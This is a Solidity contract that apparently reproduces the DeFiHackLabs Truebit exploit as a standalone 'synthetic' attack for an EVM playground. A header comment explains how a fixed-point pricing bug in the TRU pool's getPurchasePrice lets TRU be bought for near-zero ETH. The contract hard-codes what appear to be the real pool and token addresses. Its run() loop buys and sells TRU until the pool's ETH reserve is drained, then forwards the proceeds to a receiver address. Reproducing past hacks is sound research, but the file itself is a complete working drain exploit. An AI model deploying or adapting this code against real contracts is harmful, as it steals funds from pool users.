// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// SYNTHETIC exploit for the EVM Playground — a standalone contract reproducing the inline attack from
// DeFiHackLabs' Truebit_exp.sol (the Foundry test runs the whole loop as address(this), with no separate
// attack contract). run() copies testExploit()'s while-loop verbatim, minus the emit/assert calls (a
// standalone contract has no vm.* cheatcodes or console logging).
//
// Bug: TRU's bonding-curve pool prices a purchase via a formula that can be pushed toward its maximum
// representable value by choosing an "amount" that makes the internal (reserve, totalSupply) ratio hit a
// precision/overflow edge in getPurchasePrice()'s fixed-point math. solveForAmount() reverse-solves for
// the amount that drives the theoretical price to type(uint256).max, at which point getPurchasePrice()
// returns (or rounds to) far less ETH than a correctly-priced buy should cost — buying that amount of TRU
// for near-zero ETH, then selling it back on the (correctly priced) sell curve returns real ETH. Repeating
// this every round drains the pool's ETH reserve until it falls below 0.1 ETH.

interface IPOOL {
    function getPurchasePrice(uint256) external view returns (uint256);
    function sellTRU(uint256) external payable;
    function buyTRU(uint256) external payable;
    function THETA() external view returns (uint256);
    function reserve() external view returns (uint256);
}

interface IERC20Min {
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract TruebitExploit {
    IPOOL constant POOL = IPOOL(0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2);
    IERC20Min constant TRU = IERC20Min(0xf65B5C5104c4faFD4b709d9D60a185eAE063276c);

    address private immutable receiver;

    constructor(address receiver_) {
        receiver = receiver_;
    }

    receive() external payable {}

    function run() external {
        uint256 reserve;
        uint256 totalSupply;
        uint256 amount;
        uint256 price;

        while (address(POOL).balance >= 0.1 ether) {
            reserve = POOL.reserve();
            totalSupply = TRU.totalSupply();
            amount = solveForAmount(reserve, totalSupply);
            price = POOL.getPurchasePrice(amount);
            POOL.buyTRU{value: price}(amount);
            TRU.approve(address(POOL), amount);
            POOL.sellTRU(amount);
        }

        (bool sent, ) = receiver.call{value: address(this).balance}("");
        require(sent, "profit transfer failed");
    }

    function solveForAmount(uint256 reserve, uint256 totalSupply) public pure returns (uint256) {
        require(reserve > 0, "Reserve cannot be zero");
        uint256 maxPrice = type(uint256).max;
        uint256 k = maxPrice / (100 * reserve);
        uint256 tSquared = totalSupply * totalSupply;
        uint256 insideSqrt = k + tSquared;
        uint256 root = sqrt(insideSqrt);
        if (root < totalSupply) {
            return 0;
        }
        return root - totalSupply + 1;
    }

    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}
